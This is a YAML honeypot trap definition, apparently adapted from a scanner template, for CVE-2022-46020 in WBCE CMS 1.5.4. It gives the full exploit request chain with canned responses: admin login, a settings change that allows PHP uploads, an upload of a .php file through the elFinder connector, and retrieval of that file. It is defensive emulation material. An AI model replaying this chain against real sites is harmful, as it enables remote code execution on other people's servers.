id: CVE-2022-46020
info:
  name: WBCE CMS v1.5.4 -  Remote Code Execution
  author: theamanrawat
  description: 'WBCE CMS v1.5.4 can implement getshell by modifying the upload file
    type.

    '
  severity: critical
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  remediation: 'Upgrade to a patched version of WBCE CMS v1.5.5 or later to mitigate
    this vulnerability.

    '
  reference:
  - https://github.com/WBCE/WBCE_CMS
  - https://github.com/10vexh/Vulnerability/blob/main/WBCE%20CMS%20v1.5.4%20getshell.pdf
  - https://nvd.nist.gov/vuln/detail/CVE-2022-46020
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-46020
    cwe-id: CWE-434
    epss-score: 0.02743
    epss-percentile: 0.90317
    cpe: cpe:2.3:a:wbce:wbce_cms:1.5.4:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 6
    vendor: wbce
    product: wbce_cms
  tags: cve,cve2022,rce,wbce,cms,authenticated,intrusive
traps:
- request:
    method: GET
    path: /admin/login/index.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: ''
- request:
    method: POST
    path: /admin/login/index.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'url=&username_fieldname={{username_fieldname}}&password_fieldname={{password_fieldname}}&{{username_fieldname}}={{username}}&{{password_fieldname}}={{password}}&submit=Login

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /admin/settings/index.php?advanced=yes
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /admin/settings/save.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'advanced=yes&formtoken={{formtoken}}&website_title=test&website_description=&website_keywords=&website_header=&website_footer=&page_level_limit=4&page_trash=inline&page_languages=false&multiple_menus=true&home_folders=true&manage_sections=true&section_blocks=true&intro_page=false&homepage_redirection=false&smart_login=true&frontend_login=false&redirect_timer=1500&frontend_signup=false&er_level=E0&wysiwyg_editor=ckeditor&default_language=EN&default_charset=utf-8&default_timezone=0&default_date_format=d.m.Y&default_time_format=H%3Ai&default_template=wbcezon&default_theme=wbce_flat_theme&search=public&search_template=&search_footer=&search_max_excerpt=15&search_time_limit=0&page_spacer=-&app_name={{app_name}}&sec_anchor=wbce_&pages_directory=%2Fpages&media_directory=%2Fmedia&page_extension=.php&rename_files_on_upload=

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: POST
    path: /modules/elfinder/ef/php/connector.wbce.php
    headers:
      Content-Type: multipart/form-data; boundary=---------------------------213974337328367932543216511988
    body: |
      -----------------------------213974337328367932543216511988
      Content-Disposition: form-data; name="reqid"

      test
      -----------------------------213974337328367932543216511988
      Content-Disposition: form-data; name="cmd"

      upload
      -----------------------------213974337328367932543216511988
      Content-Disposition: form-data; name="target"

      l1_Lw
      -----------------------------213974337328367932543216511988
      Content-Disposition: form-data; name="upload[]"; filename="{{randstr}}.php"
      Content-Type: application/x-php

      <?php

      echo md5("CVE-2022-46020");

      ?>

      -----------------------------213974337328367932543216511988
      Content-Disposition: form-data; name="mtime[]"

      test
      -----------------------------213974337328367932543216511988--
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /media/.php
    headers: {}
    body: ''
  response:
    status_code: 200
    headers: {}
    body: 751a8ba516522786d551075a092a7a84
